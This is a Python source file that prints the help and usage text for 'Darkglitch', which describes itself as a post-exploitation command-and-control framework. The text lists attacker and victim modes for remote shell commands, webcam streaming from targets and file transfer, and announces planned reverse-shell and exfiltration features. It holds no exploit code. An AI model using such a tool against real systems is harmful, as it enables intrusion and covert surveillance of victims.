from utils import banner, version

def help():

    banner.randomizer()
    print(f"""
Darkglitch {version.version()} ( https://github.com/darkglitch )
Advanced Command & Control Framework for Remote System Management

DESCRIPTION:
  Darkglitch is a powerful post-exploitation framework designed for remote
  command execution, file transfer, and media streaming capabilities. It
  operates in a client-server architecture with secure communication.

USAGE:
  darkglitch [MODE] [OPTIONS] [ARGUMENTS]

MODES:
  Victim (Client Mode):
    darkglitch -l -c                      Listen for connections (command mode)
    darkglitch -l -s                      Listen for connections (stream mode)

  Attacker (Server Mode):
    darkglitch -ol                        List all online connected clients
    darkglitch -c <client_id> <cmd>       Execute command on target
    darkglitch -s <client_id>             Stream webcam from target
    darkglitch -u <client_id> <src>       Upload file to target
    darkglitch -d <client_id> <src>       Download file from target

GENERAL OPTIONS:
  -h, --help                              Display this help message
  -v, --version                           Display version information

CLIENT OPTIONS (Victim):
  -l, --listen                            Start client listener mode
  -c, --command                           Enable remote command execution
  -s, --stream                            Enable webcam streaming capability

SERVER OPTIONS (Attacker):
  -ol, --online-list                      Display list of connected clients
  -c, --connect <client_id> <command>     Execute remote command
  -s, --stream <client_id>                Stream target's webcam
  -u, --upload <client_id> <src> [dst]    Upload file to target
                                          (optional: specify remote path)
  -d, --download <client_id> <src> [dst]  Download file from target
                                          (optional: specify local path)

ARGUMENTS:
  <client_id>                             Target client identifier
  <command>                               Shell command to execute
  <src>, <source>                         Source file or directory path
  [dst], [destination]                    Destination path (optional)

EXAMPLES:
  # Start a client listener
  darkglitch -l -c

  # List all connected clients
  darkglitch -ol

  # Execute command on target client
  darkglitch -c "client_uuid_here" "whoami"

  # Stream webcam from target
  darkglitch -s "client_uuid_here"

  # Upload local file to target
  darkglitch -u "client_uuid_here" "/local/path/file.txt" "/remote/path/"

  # Download file from target
  darkglitch -d "client_uuid_here" "/remote/path/file.txt" "/local/path/"

COMING SOON:
  -ai, --ai-prompt                        AI-powered command generation
  -rc, --reverse-shell                    Establish reverse shell connection
  -ex, --exfiltrate                       Data exfiltration capabilities

SEE ALSO:
  GitHub: https://github.com/LaVenganzaDelLadron/darkglitch.git
  Documentation: Check README.md for detailed usage guides
    """)